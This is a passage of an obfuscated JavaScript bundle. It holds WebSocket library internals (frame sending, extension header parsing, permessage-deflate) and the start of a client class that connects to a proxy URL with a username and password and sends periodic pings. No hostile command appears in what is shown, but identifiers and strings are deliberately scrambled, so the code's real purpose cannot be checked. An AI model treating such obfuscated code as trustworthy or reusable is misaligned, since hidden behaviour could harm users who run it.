                        _0x3a176f(_0x135129) ? 0x0 !== this['_state'] ? this[_0x5c2a39(0x2c8)]([this[_0x5c2a39(0x29b)], _0x135129, this['_compress'], _0x3ba7e1, _0x212823]) : this[_0x5c2a39(0x29b)](_0x135129, this['_compress'], _0x3ba7e1, _0x212823) : 0x0 !== this['_state'] ? this[_0x5c2a39(0x2c8)]([this[_0x5c2a39(0x34f)], _0x135129, this[_0x5c2a39(0x28d)], _0x3ba7e1, _0x212823]) : this[_0x5c2a39(0x34f)](_0x135129, this[_0x5c2a39(0x28d)], _0x3ba7e1, _0x212823);
                    } [_0x3bbbee(0x29b)](_0x1fdb8c, _0x3e3193, _0x5163f5, _0x1d8c98) {
                        const _0x465bba = _0x3bbbee;
                        this[_0x465bba(0x3a6)] += _0x5163f5[_0x5956c4], this['_state'] = 0x2, _0x1fdb8c['arrayBuffer']()[_0x465bba(0x343)](_0xd48d51 => {
                            const _0x266b3c = _0x465bba;
                            if (this[_0x266b3c(0x37b)][_0x266b3c(0x328)]) {
                                const _0x5eb1c2 = new Error('The socket was closed while the blob was being read');
                                return void process[_0x266b3c(0x39e)](_0x53e916, this, _0x5eb1c2, _0x1d8c98);
                            }
                            this[_0x266b3c(0x3a6)] -= _0x5163f5[_0x5956c4];
                            const _0x3dfd1e = _0xfa8af9(_0xd48d51);
                            _0x3e3193 ? this[_0x266b3c(0x34f)](_0x3dfd1e, _0x3e3193, _0x5163f5, _0x1d8c98) : (this['_state'] = 0x0, this[_0x266b3c(0x22c)](_0x910e8['frame'](_0x3dfd1e, _0x5163f5), _0x1d8c98), this[_0x266b3c(0x1e0)]());
                        })['catch'](_0x718e69 => {
                            const _0x26e1ec = _0x465bba;
                            process[_0x26e1ec(0x39e)](_0x169d95, this, _0x718e69, _0x1d8c98);
                        });
                    } [_0x3bbbee(0x34f)](_0x50bed3, _0x5572b2, _0x25773e, _0x22fa1a) {
                        const _0x443d14 = _0x3bbbee;
                        if (!_0x5572b2) return void this[_0x443d14(0x22c)](_0x910e8[_0x443d14(0x2b3)](_0x50bed3, _0x25773e), _0x22fa1a);
                        const _0x162bb9 = this['_extensions'][_0x3c2c84[_0x443d14(0x2ad)]];
                        this['_bufferedBytes'] += _0x25773e[_0x5956c4], this[_0x443d14(0x393)] = 0x1, _0x162bb9[_0x443d14(0x2f7)](_0x50bed3, _0x25773e[_0x443d14(0x27e)], (_0x3c17ac, _0x54867c) => {
                            const _0x2789dd = _0x443d14;
                            this['_socket'][_0x2789dd(0x328)] ? _0x53e916(this, new Error(_0x2789dd(0x235)), _0x22fa1a) : (this['_bufferedBytes'] -= _0x25773e[_0x5956c4], this[_0x2789dd(0x393)] = 0x0, _0x25773e[_0x2789dd(0x39a)] = !0x1, this[_0x2789dd(0x22c)](_0x910e8[_0x2789dd(0x2b3)](_0x54867c, _0x25773e), _0x22fa1a), this['dequeue']());
                        });
                    } ['dequeue']() {
                        const _0x2022a7 = _0x3bbbee;
                        for (; 0x0 === this[_0x2022a7(0x393)] && this[_0x2022a7(0x29c)]['length'];) {
                            const _0x52040d = this[_0x2022a7(0x29c)][_0x2022a7(0x27a)]();
                            this[_0x2022a7(0x3a6)] -= _0x52040d[0x3][_0x5956c4], Reflect[_0x2022a7(0x21d)](_0x52040d[0x0], this, _0x52040d['slice'](0x1));
                        }
                    } [_0x3bbbee(0x2c8)](_0xb2ad) {
                        const _0x2af7b4 = _0x3bbbee;
                        this[_0x2af7b4(0x3a6)] += _0xb2ad[0x3][_0x5956c4], this['_queue'][_0x2af7b4(0x1fe)](_0xb2ad);
                    } ['sendFrame'](_0x135f65, _0x1282b3) {
                        const _0xeb6d09 = _0x3bbbee;
                        0x2 === _0x135f65[_0xeb6d09(0x265)] ? (this['_socket']['cork'](), this[_0xeb6d09(0x37b)][_0xeb6d09(0x3ad)](_0x135f65[0x0]), this[_0xeb6d09(0x37b)]['write'](_0x135f65[0x1], _0x1282b3), this['_socket'][_0xeb6d09(0x2a5)]()) : this['_socket'][_0xeb6d09(0x3ad)](_0x135f65[0x0], _0x1282b3);
                    }
                }

                function _0x53e916(_0xefd398, _0x30b625, _0x15ae04) {
                    const _0x4148df = _0x3bbbee;
                    _0x4148df(0x33d) == typeof _0x15ae04 && _0x15ae04(_0x30b625);
                    for (let _0x3e3a91 = 0x0; _0x3e3a91 < _0xefd398[_0x4148df(0x29c)][_0x4148df(0x265)]; _0x3e3a91++) {
                        const _0x20f2d9 = _0xefd398[_0x4148df(0x29c)][_0x3e3a91],
                            _0x27298d = _0x20f2d9[_0x20f2d9['length'] - 0x1];
                        'function' == typeof _0x27298d && _0x27298d(_0x30b625);
                    }
                }

                function _0x169d95(_0x124311, _0x1f8947, _0x55fa76) {
                    const _0x593b5f = _0x3bbbee;
                    _0x53e916(_0x124311, _0x1f8947, _0x55fa76), _0x124311[_0x593b5f(0x395)](_0x1f8947);
                }
                _0x1623cf[_0x3bbbee(0x291)] = _0x910e8;
            },
            0x39e(_0x104c71, _0x2e10ff, _0x4a2f64) {
                'use strict';
                const _0x553f26 = a0_0x2568;
                const {
                    tokenChars: _0xbaa557
                } = _0x4a2f64(0x370);

                function _0x44b567(_0x438d5c, _0x3a6f13, _0x68610c) {
                    const _0xa1a92e = a0_0x2568;
                    void 0x0 === _0x438d5c[_0x3a6f13] ? _0x438d5c[_0x3a6f13] = [_0x68610c] : _0x438d5c[_0x3a6f13][_0xa1a92e(0x1fe)](_0x68610c);
                }
                _0x104c71[_0x553f26(0x291)] = {
                    'format': function (_0xa9fadf) {
                        const _0x918add = _0x553f26;
                        return Object[_0x918add(0x2e5)](_0xa9fadf)[_0x918add(0x1cb)](_0x3bde17 => {
                            const _0x42fa82 = _0x918add;
                            let _0x350d3a = _0xa9fadf[_0x3bde17];
                            return Array[_0x42fa82(0x346)](_0x350d3a) || (_0x350d3a = [_0x350d3a]), _0x350d3a[_0x42fa82(0x1cb)](_0x3e1a2e => [_0x3bde17][_0x42fa82(0x3ae)](Object[_0x42fa82(0x2e5)](_0x3e1a2e)[_0x42fa82(0x1cb)](_0x165b6f => {
                                const _0x3592fb = _0x42fa82;
                                let _0x10f575 = _0x3e1a2e[_0x165b6f];
                                return Array[_0x3592fb(0x346)](_0x10f575) || (_0x10f575 = [_0x10f575]), _0x10f575['map'](_0x8fbaea => !0x0 === _0x8fbaea ? _0x165b6f : _0x165b6f + '=' + _0x8fbaea)['join']('; ');
                            }))['join']('; '))[_0x42fa82(0x2ab)](', ');
                        })[_0x918add(0x2ab)](', ');
                    },
                    'parse': function (_0x49bb34) {
                        const _0x2068ff = _0x553f26,
                            _0x410b8e = Object['create'](null);
                        let _0x59b160, _0x3759f7, _0x2584b5 = Object[_0x2068ff(0x36d)](null),
                            _0x497b2e = !0x1,
                            _0x2e8de3 = !0x1,
                            _0x544103 = !0x1,
                            _0x15d8ed = -0x1,
                            _0x242108 = -0x1,
                            _0xbed9bd = -0x1,
                            _0x4985b4 = 0x0;
                        for (; _0x4985b4 < _0x49bb34['length']; _0x4985b4++)
                            if (_0x242108 = _0x49bb34[_0x2068ff(0x2d2)](_0x4985b4), void 0x0 === _0x59b160) {
                                if (-0x1 === _0xbed9bd && 0x1 === _0xbaa557[_0x242108]) - 0x1 === _0x15d8ed && (_0x15d8ed = _0x4985b4);
                                else {
                                    if (0x0 === _0x4985b4 || 0x20 !== _0x242108 && 0x9 !== _0x242108) {
                                        if (0x3b !== _0x242108 && 0x2c !== _0x242108) throw new SyntaxError(_0x2068ff(0x2fb) + _0x4985b4); {
                                            if (-0x1 === _0x15d8ed) throw new SyntaxError(_0x2068ff(0x2fb) + _0x4985b4); - 0x1 === _0xbed9bd && (_0xbed9bd = _0x4985b4);
                                            const _0x22dd37 = _0x49bb34[_0x2068ff(0x3a7)](_0x15d8ed, _0xbed9bd);
                                            0x2c === _0x242108 ? (_0x44b567(_0x410b8e, _0x22dd37, _0x2584b5), _0x2584b5 = Object[_0x2068ff(0x36d)](null)) : _0x59b160 = _0x22dd37, _0x15d8ed = _0xbed9bd = -0x1;
                                        }
                                    } else -0x1 === _0xbed9bd && -0x1 !== _0x15d8ed && (_0xbed9bd = _0x4985b4);
                                }
                            } else {
                                if (void 0x0 === _0x3759f7) {
                                    if (-0x1 === _0xbed9bd && 0x1 === _0xbaa557[_0x242108]) - 0x1 === _0x15d8ed && (_0x15d8ed = _0x4985b4);
                                    else {
                                        if (0x20 === _0x242108 || 0x9 === _0x242108) - 0x1 === _0xbed9bd && -0x1 !== _0x15d8ed && (_0xbed9bd = _0x4985b4);
                                        else {
                                            if (0x3b === _0x242108 || 0x2c === _0x242108) {
                                                if (-0x1 === _0x15d8ed) throw new SyntaxError('Unexpected character at index ' + _0x4985b4); - 0x1 === _0xbed9bd && (_0xbed9bd = _0x4985b4), _0x44b567(_0x2584b5, _0x49bb34[_0x2068ff(0x3a7)](_0x15d8ed, _0xbed9bd), !0x0), 0x2c === _0x242108 && (_0x44b567(_0x410b8e, _0x59b160, _0x2584b5), _0x2584b5 = Object[_0x2068ff(0x36d)](null), _0x59b160 = void 0x0), _0x15d8ed = _0xbed9bd = -0x1;
                                            } else {
                                                if (0x3d !== _0x242108 || -0x1 === _0x15d8ed || -0x1 !== _0xbed9bd) throw new SyntaxError('Unexpected character at index ' + _0x4985b4);
                                                _0x3759f7 = _0x49bb34[_0x2068ff(0x3a7)](_0x15d8ed, _0x4985b4), _0x15d8ed = _0xbed9bd = -0x1;
                                            }
                                        }
                                    }
                                } else {
                                    if (_0x2e8de3) {
                                        if (0x1 !== _0xbaa557[_0x242108]) throw new SyntaxError(_0x2068ff(0x2fb) + _0x4985b4); - 0x1 === _0x15d8ed ? _0x15d8ed = _0x4985b4 : _0x497b2e || (_0x497b2e = !0x0), _0x2e8de3 = !0x1;
                                    } else {
                                        if (_0x544103) {
                                            if (0x1 === _0xbaa557[_0x242108]) - 0x1 === _0x15d8ed && (_0x15d8ed = _0x4985b4);
                                            else {
                                                if (0x22 === _0x242108 && -0x1 !== _0x15d8ed) _0x544103 = !0x1, _0xbed9bd = _0x4985b4;
                                                else {
                                                    if (0x5c !== _0x242108) throw new SyntaxError('Unexpected character at index ' + _0x4985b4);
                                                    _0x2e8de3 = !0x0;
                                                }
                                            }
                                        } else {
                                            if (0x22 === _0x242108 && 0x3d === _0x49bb34[_0x2068ff(0x2d2)](_0x4985b4 - 0x1)) _0x544103 = !0x0;
                                            else {
                                                if (-0x1 === _0xbed9bd && 0x1 === _0xbaa557[_0x242108]) - 0x1 === _0x15d8ed && (_0x15d8ed = _0x4985b4);
                                                else {
                                                    if (-0x1 === _0x15d8ed || 0x20 !== _0x242108 && 0x9 !== _0x242108) {
                                                        if (0x3b !== _0x242108 && 0x2c !== _0x242108) throw new SyntaxError(_0x2068ff(0x2fb) + _0x4985b4); {
                                                            if (-0x1 === _0x15d8ed) throw new SyntaxError('Unexpected character at index ' + _0x4985b4); - 0x1 === _0xbed9bd && (_0xbed9bd = _0x4985b4);
                                                            let _0x1705e6 = _0x49bb34[_0x2068ff(0x3a7)](_0x15d8ed, _0xbed9bd);
                                                            _0x497b2e && (_0x1705e6 = _0x1705e6[_0x2068ff(0x38a)](/\\/g, ''), _0x497b2e = !0x1), _0x44b567(_0x2584b5, _0x3759f7, _0x1705e6), 0x2c === _0x242108 && (_0x44b567(_0x410b8e, _0x59b160, _0x2584b5), _0x2584b5 = Object[_0x2068ff(0x36d)](null), _0x59b160 = void 0x0), _0x3759f7 = void 0x0, _0x15d8ed = _0xbed9bd = -0x1;
                                                        }
                                                    } else -0x1 === _0xbed9bd && (_0xbed9bd = _0x4985b4);
                                                }
                                            }
                                        }
                                    }
                                }
                            } if (-0x1 === _0x15d8ed || _0x544103 || 0x20 === _0x242108 || 0x9 === _0x242108) throw new SyntaxError('Unexpected end of input'); - 0x1 === _0xbed9bd && (_0xbed9bd = _0x4985b4);
                        const _0x53f70b = _0x49bb34[_0x2068ff(0x3a7)](_0x15d8ed, _0xbed9bd);
                        return void 0x0 === _0x59b160 ? _0x44b567(_0x410b8e, _0x53f70b, _0x2584b5) : (void 0x0 === _0x3759f7 ? _0x44b567(_0x2584b5, _0x53f70b, !0x0) : _0x44b567(_0x2584b5, _0x3759f7, _0x497b2e ? _0x53f70b[_0x2068ff(0x38a)](/\\/g, '') : _0x53f70b), _0x44b567(_0x410b8e, _0x59b160, _0x2584b5)), _0x410b8e;
                    }
                };
            },
            0x3a0(_0x1ae9b3) {
                'use strict';
                const _0x414aa2 = a0_0x2568;
                _0x1ae9b3[_0x414aa2(0x291)] = require('path');
            },
            0x3cb(_0x1548b5, _0x2b99ff, _0x3683bd) {
                'use strict';
                const _0x3a1c2b = a0_0x2568;
                const _0xe9609 = _0x3683bd(0x6a),
                    _0x5e2115 = _0x3683bd(0x152),
                    _0x462efa = _0x3683bd(0x2f7),
                    {
                        kStatusCode: _0x39c2ef
                    } = _0x3683bd(0x266),
                    _0x3757f8 = Buffer[Symbol[_0x3a1c2b(0x295)]],
                    _0x2e654b = Buffer['from']([0x0, 0x0, 0xff, 0xff]),
                    _0x1679ee = Symbol(_0x3a1c2b(0x33e)),
                    _0x857e9a = Symbol('total-length'),
                    _0x3b6bb0 = Symbol('callback'),
                    _0x35d4e9 = Symbol(_0x3a1c2b(0x20b)),
                    _0x2aa41f = Symbol(_0x3a1c2b(0x2ee));
                let _0xb4e988;

                function _0x4f0fd4(_0x370d2f) {
                    const _0x550142 = _0x3a1c2b;
                    this[_0x35d4e9][_0x550142(0x1fe)](_0x370d2f), this[_0x857e9a] += _0x370d2f['length'];
                }

                function _0x1198f7(_0x5997b5) {
                    const _0x43f073 = _0x3a1c2b;
                    this[_0x857e9a] += _0x5997b5[_0x43f073(0x265)], this[_0x1679ee][_0x43f073(0x325)] < 0x1 || this[_0x857e9a] <= this[_0x1679ee]['_maxPayload'] ? this[_0x35d4e9][_0x43f073(0x1fe)](_0x5997b5) : (this[_0x2aa41f] = new RangeError(_0x43f073(0x1df)), this[_0x2aa41f][_0x43f073(0x24b)] = _0x43f073(0x34c), this[_0x2aa41f][_0x39c2ef] = 0x3f1, this[_0x43f073(0x1eb)](_0x43f073(0x387), _0x1198f7), this[_0x43f073(0x25e)]());
                }

                function _0x143daf(_0x428838) {
                    const _0x4c63f3 = _0x3a1c2b;
                    this[_0x1679ee][_0x4c63f3(0x3ab)] = null, this[_0x2aa41f] ? this[_0x3b6bb0](this[_0x2aa41f]) : (_0x428838[_0x39c2ef] = 0x3ef, this[_0x3b6bb0](_0x428838));
                }
                _0x1548b5[_0x3a1c2b(0x291)] = class {
                    constructor(_0x1b323f, _0x34e294, _0x3ac26f) {
                        const _0x1da2a5 = _0x3a1c2b;
                        if (this['_maxPayload'] = 0x0 | _0x3ac26f, this['_options'] = _0x1b323f || {}, this[_0x1da2a5(0x30e)] = void 0x0 !== this[_0x1da2a5(0x363)][_0x1da2a5(0x2e6)] ? this[_0x1da2a5(0x363)]['threshold'] : 0x400, this[_0x1da2a5(0x34a)] = !!_0x34e294, this[_0x1da2a5(0x1ee)] = null, this[_0x1da2a5(0x3ab)] = null, this['params'] = null, !_0xb4e988) {
                            const _0x2d7a7f = void 0x0 !== this[_0x1da2a5(0x363)]['concurrencyLimit'] ? this[_0x1da2a5(0x363)][_0x1da2a5(0x22b)] : 0xa;
                            _0xb4e988 = new _0x462efa(_0x2d7a7f);
                        }
                    }
                    static get[_0x3a1c2b(0x2ad)]() {
                        const _0x2a7f5f = _0x3a1c2b;
                        return _0x2a7f5f(0x33e);
                    } [_0x3a1c2b(0x397)]() {
                        const _0x2fe3a9 = _0x3a1c2b,
                            _0x561bc0 = {};
                        return this[_0x2fe3a9(0x363)][_0x2fe3a9(0x26e)] && (_0x561bc0['server_no_context_takeover'] = !0x0), this[_0x2fe3a9(0x363)][_0x2fe3a9(0x2bd)] && (_0x561bc0[_0x2fe3a9(0x2f0)] = !0x0), this[_0x2fe3a9(0x363)]['serverMaxWindowBits'] && (_0x561bc0[_0x2fe3a9(0x344)] = this[_0x2fe3a9(0x363)][_0x2fe3a9(0x34d)]), this['_options']['clientMaxWindowBits'] ? _0x561bc0['client_max_window_bits'] = this[_0x2fe3a9(0x363)][_0x2fe3a9(0x242)] : null == this['_options'][_0x2fe3a9(0x242)] && (_0x561bc0['client_max_window_bits'] = !0x0), _0x561bc0;
                    } ['accept'](_0x5ec1a0) {
                        const _0x559ed2 = _0x3a1c2b;
                        return _0x5ec1a0 = this[_0x559ed2(0x333)](_0x5ec1a0), this[_0x559ed2(0x1e1)] = this[_0x559ed2(0x34a)] ? this['acceptAsServer'](_0x5ec1a0) : this[_0x559ed2(0x309)](_0x5ec1a0), this[_0x559ed2(0x1e1)];
                    } [_0x3a1c2b(0x348)]() {
                        const _0x4939ec = _0x3a1c2b;
                        if (this[_0x4939ec(0x3ab)] && (this[_0x4939ec(0x3ab)][_0x4939ec(0x2b4)](), this[_0x4939ec(0x3ab)] = null), this[_0x4939ec(0x1ee)]) {
                            const _0x5aa084 = this[_0x4939ec(0x1ee)][_0x3b6bb0];
                            this[_0x4939ec(0x1ee)][_0x4939ec(0x2b4)](), this['_deflate'] = null, _0x5aa084 && _0x5aa084(new Error('The deflate stream was closed while data was being processed'));
                        }
                    } [_0x3a1c2b(0x1f9)](_0x4de2ac) {
                        const _0x5399d3 = _0x3a1c2b,
                            _0x1f5deb = this[_0x5399d3(0x363)],
                            _0x452698 = _0x4de2ac[_0x5399d3(0x270)](_0x361bad => !(!0x1 === _0x1f5deb[_0x5399d3(0x26e)] && _0x361bad[_0x5399d3(0x21c)] || _0x361bad[_0x5399d3(0x344)] && (!0x1 === _0x1f5deb[_0x5399d3(0x34d)] || _0x5399d3(0x1ff) == typeof _0x1f5deb[_0x5399d3(0x34d)] && _0x1f5deb['serverMaxWindowBits'] > _0x361bad[_0x5399d3(0x344)]) || 'number' == typeof _0x1f5deb[_0x5399d3(0x242)] && !_0x361bad['client_max_window_bits']));
                        if (!_0x452698) throw new Error('None of the extension offers can be accepted');
                        return _0x1f5deb['serverNoContextTakeover'] && (_0x452698['server_no_context_takeover'] = !0x0), _0x1f5deb[_0x5399d3(0x2bd)] && (_0x452698[_0x5399d3(0x2f0)] = !0x0), 'number' == typeof _0x1f5deb[_0x5399d3(0x34d)] && (_0x452698['server_max_window_bits'] = _0x1f5deb[_0x5399d3(0x34d)]), _0x5399d3(0x1ff) == typeof _0x1f5deb['clientMaxWindowBits'] ? _0x452698['client_max_window_bits'] = _0x1f5deb[_0x5399d3(0x242)] : !0x0 !== _0x452698['client_max_window_bits'] && !0x1 !== _0x1f5deb[_0x5399d3(0x242)] || delete _0x452698[_0x5399d3(0x22e)], _0x452698;
                    } [_0x3a1c2b(0x309)](_0x1e8a73) {
                        const _0x495e5f = _0x3a1c2b,
                            _0x2bd755 = _0x1e8a73[0x0];
                        if (!0x1 === this[_0x495e5f(0x363)]['clientNoContextTakeover'] && _0x2bd755[_0x495e5f(0x2f0)]) throw new Error('Unexpected parameter \"client_no_context_takeover\"');
                        if (_0x2bd755['client_max_window_bits']) {
                            if (!0x1 === this[_0x495e5f(0x363)]['clientMaxWindowBits'] || 'number' == typeof this[_0x495e5f(0x363)][_0x495e5f(0x242)] && _0x2bd755[_0x495e5f(0x22e)] > this[_0x495e5f(0x363)][_0x495e5f(0x242)]) throw new Error(_0x495e5f(0x324));
                        } else _0x495e5f(0x1ff) == typeof this[_0x495e5f(0x363)][_0x495e5f(0x242)] && (_0x2bd755[_0x495e5f(0x22e)] = this[_0x495e5f(0x363)][_0x495e5f(0x242)]);
                        return _0x2bd755;
                    } [_0x3a1c2b(0x333)](_0x3462a8) {
                        const _0x553344 = _0x3a1c2b;
                        return _0x3462a8[_0x553344(0x280)](_0x54242f => {
                            const _0x38072e = _0x553344;
                            Object[_0x38072e(0x2e5)](_0x54242f)[_0x38072e(0x280)](_0x6d4a0c => {
                                const _0x3c8de0 = _0x38072e;
                                let _0x34280e = _0x54242f[_0x6d4a0c];
                                if (_0x34280e[_0x3c8de0(0x265)] > 0x1) throw new Error(_0x3c8de0(0x380) + _0x6d4a0c + _0x3c8de0(0x256));
                                if (_0x34280e = _0x34280e[0x0], 'client_max_window_bits' === _0x6d4a0c) {
                                    if (!0x0 !== _0x34280e) {
                                        const _0x562c78 = +_0x34280e;
                                        if (!Number['isInteger'](_0x562c78) || _0x562c78 < 0x8 || _0x562c78 > 0xf) throw new TypeError(_0x3c8de0(0x30d) + _0x6d4a0c + _0x3c8de0(0x2b8) + _0x34280e);
                                        _0x34280e = _0x562c78;
                                    } else {
                                        if (!this['_isServer']) throw new TypeError(_0x3c8de0(0x30d) + _0x6d4a0c + '\": ' + _0x34280e);
                                    }
                                } else {
                                    if (_0x3c8de0(0x344) === _0x6d4a0c) {
                                        const _0x595ff6 = +_0x34280e;
                                        if (!Number[_0x3c8de0(0x3a0)](_0x595ff6) || _0x595ff6 < 0x8 || _0x595ff6 > 0xf) throw new TypeError(_0x3c8de0(0x30d) + _0x6d4a0c + _0x3c8de0(0x2b8) + _0x34280e);
                                        _0x34280e = _0x595ff6;
                                    } else {
                                        if (_0x3c8de0(0x2f0) !== _0x6d4a0c && _0x3c8de0(0x21c) !== _0x6d4a0c) throw new Error('Unknown parameter \"' + _0x6d4a0c + '\"');
                                        if (!0x0 !== _0x34280e) throw new TypeError(_0x3c8de0(0x30d) + _0x6d4a0c + _0x3c8de0(0x2b8) + _0x34280e);
                                    }
                                }
                                _0x54242f[_0x6d4a0c] = _0x34280e;
                            });
                        }), _0x3462a8;
                    } ['decompress'](_0x56d228, _0x4ebfcc, _0x502be4) {
                        const _0x3c7e73 = _0x3a1c2b;
                        _0xb4e988[_0x3c7e73(0x20d)](_0xaf30c3 => {
                            const _0x501ec9 = _0x3c7e73;
                            this[_0x501ec9(0x2a6)](_0x56d228, _0x4ebfcc, (_0x517c66, _0x4aa341) => {
                                _0xaf30c3(), _0x502be4(_0x517c66, _0x4aa341);
                            });
                        });
                    } [_0x3a1c2b(0x2f7)](_0x1b4837, _0xc4d665, _0x5adcd6) {
                        _0xb4e988['add'](_0x2431dc => {
                            const _0x2ae28e = a0_0x2568;
                            this[_0x2ae28e(0x28d)](_0x1b4837, _0xc4d665, (_0x1282ed, _0x5c3eab) => {
                                _0x2431dc(), _0x5adcd6(_0x1282ed, _0x5c3eab);
                            });
                        });
                    } [_0x3a1c2b(0x2a6)](_0x5937e2, _0x588e5c, _0x151bac) {
                        const _0x2b23d0 = _0x3a1c2b,
                            _0x5eb741 = this[_0x2b23d0(0x34a)] ? _0x2b23d0(0x225) : 'server';
                        if (!this[_0x2b23d0(0x3ab)]) {
                            const _0x563e6e = _0x5eb741 + _0x2b23d0(0x30a),
                                _0x2ba804 = 'number' != typeof this['params'][_0x563e6e] ? _0xe9609[_0x2b23d0(0x246)] : this[_0x2b23d0(0x1e1)][_0x563e6e];
                            this['_inflate'] = _0xe9609[_0x2b23d0(0x2c2)]({
                                ...this[_0x2b23d0(0x363)][_0x2b23d0(0x1e6)],
                                'windowBits': _0x2ba804
                            }), this[_0x2b23d0(0x3ab)][_0x1679ee] = this, this['_inflate'][_0x857e9a] = 0x0, this[_0x2b23d0(0x3ab)][_0x35d4e9] = [], this[_0x2b23d0(0x3ab)]['on']('error', _0x143daf), this[_0x2b23d0(0x3ab)]['on'](_0x2b23d0(0x387), _0x1198f7);
                        }
                        this['_inflate'][_0x3b6bb0] = _0x151bac, this[_0x2b23d0(0x3ab)][_0x2b23d0(0x3ad)](_0x5937e2), _0x588e5c && this[_0x2b23d0(0x3ab)]['write'](_0x2e654b), this[_0x2b23d0(0x3ab)]['flush'](() => {
                            const _0x26a6a1 = _0x2b23d0,
                                _0x167ebd = this[_0x26a6a1(0x3ab)][_0x2aa41f];
                            if (_0x167ebd) return this['_inflate']['close'](), this[_0x26a6a1(0x3ab)] = null, void _0x151bac(_0x167ebd);
                            const _0x339aa8 = _0x5e2115[_0x26a6a1(0x3ae)](this[_0x26a6a1(0x3ab)][_0x35d4e9], this[_0x26a6a1(0x3ab)][_0x857e9a]);
                            this[_0x26a6a1(0x3ab)][_0x26a6a1(0x250)][_0x26a6a1(0x234)] ? (this[_0x26a6a1(0x3ab)][_0x26a6a1(0x2b4)](), this[_0x26a6a1(0x3ab)] = null) : (this[_0x26a6a1(0x3ab)][_0x857e9a] = 0x0, this[_0x26a6a1(0x3ab)][_0x35d4e9] = [], _0x588e5c && this[_0x26a6a1(0x1e1)][_0x5eb741 + _0x26a6a1(0x24f)] && this[_0x26a6a1(0x3ab)][_0x26a6a1(0x25e)]()), _0x151bac(null, _0x339aa8);
                        });
                    } [_0x3a1c2b(0x28d)](_0xdb673e, _0x29db44, _0x50423b) {
                        const _0x5c995f = _0x3a1c2b,
                            _0x5e18f2 = this[_0x5c995f(0x34a)] ? 'server' : _0x5c995f(0x225);
                        if (!this[_0x5c995f(0x1ee)]) {
                            const _0x517294 = _0x5e18f2 + _0x5c995f(0x30a),
                                _0x2fbf2d = _0x5c995f(0x1ff) != typeof this[_0x5c995f(0x1e1)][_0x517294] ? _0xe9609[_0x5c995f(0x246)] : this[_0x5c995f(0x1e1)][_0x517294];
                            this[_0x5c995f(0x1ee)] = _0xe9609['createDeflateRaw']({
                                ...this[_0x5c995f(0x363)][_0x5c995f(0x212)],
                                'windowBits': _0x2fbf2d
                            }), this[_0x5c995f(0x1ee)][_0x857e9a] = 0x0, this['_deflate'][_0x35d4e9] = [], this[_0x5c995f(0x1ee)]['on']('data', _0x4f0fd4);
                        }
                        this['_deflate'][_0x3b6bb0] = _0x50423b, this[_0x5c995f(0x1ee)]['write'](_0xdb673e), this[_0x5c995f(0x1ee)][_0x5c995f(0x205)](_0xe9609[_0x5c995f(0x1cc)], () => {
                            const _0x2012ae = _0x5c995f;
                            if (!this[_0x2012ae(0x1ee)]) return;
                            let _0x2f16ae = _0x5e2115['concat'](this[_0x2012ae(0x1ee)][_0x35d4e9], this['_deflate'][_0x857e9a]);
                            _0x29db44 && (_0x2f16ae = new _0x3757f8(_0x2f16ae[_0x2012ae(0x27c)], _0x2f16ae[_0x2012ae(0x21e)], _0x2f16ae[_0x2012ae(0x265)] - 0x4)), this[_0x2012ae(0x1ee)][_0x3b6bb0] = null, this[_0x2012ae(0x1ee)][_0x857e9a] = 0x0, this['_deflate'][_0x35d4e9] = [], _0x29db44 && this[_0x2012ae(0x1e1)][_0x5e18f2 + '_no_context_takeover'] && this[_0x2012ae(0x1ee)][_0x2012ae(0x25e)](), _0x50423b(null, _0x2f16ae);
                        });
                    }
                };
            },
            0x3d6(_0x287c37) {
                'use strict';
                const _0x1701e4 = a0_0x2568;
                _0x287c37['exports'] = require(_0x1701e4(0x1fc));
            }
        },
        _0x440e6a = {};

    function _0x8ca0ec(_0x3928f1) {
        const _0x59461a = a0_0x2568;
        var _0x173a27 = _0x440e6a[_0x3928f1];
        if (void 0x0 !== _0x173a27) return _0x173a27[_0x59461a(0x291)];
        var _0x122d1c = _0x440e6a[_0x3928f1] = {
            'id': _0x3928f1,
            'loaded': !0x1,
            'exports': {}
        };
        return _0xb9341a[_0x3928f1](_0x122d1c, _0x122d1c[_0x59461a(0x291)], _0x8ca0ec), _0x122d1c[_0x59461a(0x2ed)] = !0x0, _0x122d1c['exports'];
    }
    _0x8ca0ec[_0x1898e4(0x1d4)] = _0x6fb442 => (_0x6fb442[_0x1898e4(0x263)] = [], _0x6fb442[_0x1898e4(0x31b)] || (_0x6fb442[_0x1898e4(0x31b)] = []), _0x6fb442), _0x8ca0ec['p'] = '';
    const _0x235f91 = _0x8ca0ec(0x2bb),
        _0x135e6f = _0x8ca0ec(0x1b2),
        _0x254890 = _0x8ca0ec(0x380),
        _0x15c637 = _0x8ca0ec(0x2b4);
    class _0x49dedf extends _0x135e6f {
        constructor({
            proxyUrl: _0x351efe,
            username: _0x1fcce2,
            password: _0x368fae,
            agent: _0x151249,
            retryDelay: _0x34c347 = 0xbb8,
            maxRetries: _0x29ca06 = 0x0
        }) {
            const _0x139e03 = _0x1898e4;
            super(), this[_0x139e03(0x2da)] = _0x351efe, this[_0x139e03(0x32a)] = _0x1fcce2, this['password'] = _0x368fae, this[_0x139e03(0x2f2)] = _0x151249, this[_0x139e03(0x2ca)] = _0x34c347, this['maxRetries'] = _0x29ca06, this['retryCount'] = 0x0, this['ws'] = null, this[_0x139e03(0x32f)] = null, this['connected'] = !0x1, this[_0x139e03(0x2ec)] = null, this['pingIntervalMs'] = 0x7530;
        } ['connect']() {
            const _0x1a3bce = _0x1898e4;
            this[_0x1a3bce(0x1dd)]();
        } [_0x1898e4(0x398)]() {
            const _0x3ea0f7 = _0x1898e4;
            this[_0x3ea0f7(0x2ec)] && clearInterval(this[_0x3ea0f7(0x2ec)]), this[_0x3ea0f7(0x2ec)] = setInterval(() => {
                const _0x4a8c6e = _0x3ea0f7;
                if (this['ws'] && 0x1 === this['ws'][_0x4a8c6e(0x36a)]) try {
                    this[_0x4a8c6e(0x33c)]({
                        'method': _0x4a8c6e(0x285),
                        'params': []
                    });
                } catch (_0xad54e4) {
                    this['emit']('error', _0xad54e4);
                }
            }, this[_0x3ea0f7(0x26d)]);
        } [_0x1898e4(0x1dd)]() {
            const _0x57aea7 = _0x1898e4;
            this['ws'] = new _0x235f91(this[_0x57aea7(0x2da)]), this['ws']['on'](_0x57aea7(0x31a), () => {
                const _0x328aff = _0x57aea7;
                this[_0x328aff(0x25b)] = !0x0, this[_0x328aff(0x2d1)] = 0x0, this[_0x328aff(0x2d4)](), this[_0x328aff(0x398)](), this[_0x328aff(0x31d)]('connected');
